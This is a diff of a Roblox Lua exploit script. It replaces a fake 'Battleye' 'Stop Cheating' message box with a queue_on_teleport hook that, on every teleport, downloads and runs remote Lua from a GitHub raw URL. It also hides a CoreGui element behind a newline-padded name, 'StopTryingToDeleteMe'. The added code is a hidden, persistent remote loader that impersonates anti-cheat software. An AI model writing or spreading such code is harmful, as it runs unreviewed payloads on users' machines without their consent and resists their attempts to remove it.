@@ -1,23 +1,14 @@
-local yeah=[[
 task.wait(0.15)
 local G2L = {};
-const function ha()
-local MB_OK = 0x00000000
-local MB_ICONWARNING = 0x00000030
-local MB_TOPMOST = 0x00040000
-
-messagebox(
-    "Stop Cheating",
-    "Battleye",
-    bit32.bor(MB_OK, MB_ICONWARNING, MB_TOPMOST)
-)
-end 
-ha()
+const function yeaa()
+queueonteleport=queueonteleport or queue_on_teleport
 queueonteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/whoisthisxor/assets/refs/heads/main/battleye.lua"))()')
+end
+task.spawn(yeaa)
 local pgui=game:GetService("CoreGui")
 -- StarterGui.
 G2L["1"] = Instance.new("ScreenGui",pgui)
-G2L["1"]["Name"] = ''
+G2L["1"]["Name"] = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStopTryingToDeleteMe'
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 
@@ -81,6 +72,3 @@ G2L["6"]["Name"] = "black"
 
 
 return G2L["1"], require;
-
-]]
-local haa=loadstring(yeah)()
